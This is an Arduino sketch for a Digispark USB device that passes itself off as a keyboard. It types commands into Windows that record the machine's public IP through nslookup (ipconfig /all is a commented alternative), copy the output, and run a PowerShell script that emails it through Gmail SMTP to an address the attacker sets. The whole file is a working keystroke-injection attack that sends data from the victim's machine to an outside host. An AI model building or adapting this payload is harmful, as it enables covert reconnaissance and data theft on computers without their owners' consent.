//If you are using gmail, you MUST enable "Less Secure App Access" in your user account settings or this will fail.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("nslookup myip.opendns.com resolver1.opendns.com");
  DigiKeyboard.delay(500);
  //OR
  //DigiKeyboard.print("ipconfig\all");
  //DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500); 
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500); 
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500); 
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

// User variables start

  //from email address:
  DigiKeyboard.print(F("$email = \"YOUREMAILADRESS@gmail.com\";"));
  //to email address
  DigiKeyboard.print(F("$adress = \"YOUREMAILADRESS@gmail.com\";"));
  //'from address' email account password
  DigiKeyboard.print(F("$pass = \"YOURPASSWORDTOEMAIL\";"));
  //smtp server
  DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
  //smtp server port
  DigiKeyboard.print(F("$port = \"587\";"));
  
  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboard.print(F("$msg.From = \"$email\";"));
  DigiKeyboard.print(F("$msg.To.Add(\"$adress\");"));
  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboard.print(F("$msg.Subject = \"Config\";"));
  DigiKeyboard.print(F("$msg.Body = \"<h1>Computer Configuration:</h1><pre> "));
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
  DigiKeyboard.print(F("</pre>\"; "));
  DigiKeyboard.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboard.print(F("$smtp.Send($msg);"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
